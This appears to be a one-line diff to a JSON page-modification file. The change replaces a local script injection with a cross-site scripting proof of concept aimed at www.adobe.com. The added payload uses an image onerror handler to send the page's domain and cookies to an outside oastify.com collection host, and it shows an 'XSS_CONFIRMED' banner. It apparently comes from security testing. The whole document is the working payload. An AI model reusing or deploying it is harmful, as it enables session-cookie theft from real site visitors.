@@ -1,1 +1,1 @@
-{"data":[{"selector":"","action":"insertscript","all":"http://127.0.0.1:8899/xss.js"}]}
+{"data":[{"selector":"main","action":"prepend","all":"<img src=x onerror=\"new Image().src='https://l6sudowizr5yb8alg57mv7yin9t0qogc5.oastify.com/xss?d='+document.domain+'&c='+encodeURIComponent(document.cookie)\"><div id=mep-xss style='position:fixed;top:0;left:0;width:100%;background:#c0392b;color:white;padding:20px;font-size:22px;z-index:99999;font-weight:bold'>XSS_CONFIRMED on www.adobe.com</div>"}]}
